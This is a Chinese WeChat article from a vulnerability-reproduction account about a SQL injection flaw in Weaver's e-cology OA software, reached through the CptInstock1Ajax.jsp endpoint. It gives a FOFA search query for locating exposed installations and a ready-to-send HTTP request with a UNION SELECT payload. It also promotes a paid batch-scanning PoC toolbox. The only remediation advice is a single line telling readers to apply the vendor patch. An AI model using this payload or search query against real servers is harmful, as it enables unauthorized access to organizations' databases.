#  泛微e-cology CptInstock1Ajax.jsp接口存在SQL注入漏洞 附POC   
2024-10-15更新  南风漏洞复现文库   2024-10-15 23:29  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 泛微e-cology简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
泛微e-cology依托全新的设计理念,全新的管理思想为中大型组织创建全新的高效协同办公环境。  
## 2.漏洞描述  
  
泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微e-cology CptInstock1Ajax.jsp接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
泛微e-cology  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgBbFibydnYXBNTGkRNXT0wEenwF1ojpRP6q2JcJnibzVKunlIsARTPiaaA/640?wx_fmt=png&from=appmsg "null")  
  
泛微e-cology CptInstock1Ajax.jsp接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="泛微-OA（e-cology）"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1#  
  
漏洞数据包：  
```
GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKg1tGFDbwYPlWr0xdu1qP2ePayOjUSyvYdMKLNq58XhwycPDTCzdyWgA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgiaJ6AicrvSUmsSQx38D5ShoxdyqcticDWBVWviaf8ybGnFtcDLX6CSGOHQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgKTWhvpaxUZJPicJib92oWUGr1lVcygyXf1Yg0No5NF5OwxUB0zLIGKxw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgqv8WLhcIcFbZvicj7cngGdWB7R1bW1JFKldNHmS3p8tSXG8OawDyJYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgGE3Rf5pMcic7WGj7qaxvsMnF4iaa6eqSI8MibNbOJdlmpKeJ8ImLfPibTg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgVmYaStzhVc7rLxnHMpickvL5zzQ7Pu8DsFOj0vQLScanm2Djwm8SGPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsEEZhAFdjCsn9jBq79icKgHZXBtxyNQj4cVxbHyMLdsnlrU0yCvMVSvRib00lKk6s7Yicib8DtQDVWA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系官方打补丁：https://www.weaver.com.cn/e9/  
## 8.往期回顾  
  
[灵当CRM pdf.php接口处存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487522&idx=1&sn=2594bc5303d5f60761f7ea5397e38b1c&chksm=974b9d25a03c14330ff6f7ca85d472082d2c31fe45936d05d66931539d17b44c88ad83bec551&scene=21#wechat_redirect)  
  
  
[灵当CRM wechatSession/index.php接口处存在文件上传漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487509&idx=1&sn=ef7b4ed4bce6dbe5db7f2055a04a98f0&chksm=974b9d12a03c1404c6e38166520f6d3d496cd1c2031477c995970e5abbe8b9dcdeed11dc0c39&scene=21#wechat_redirect)  
  
  
  
  
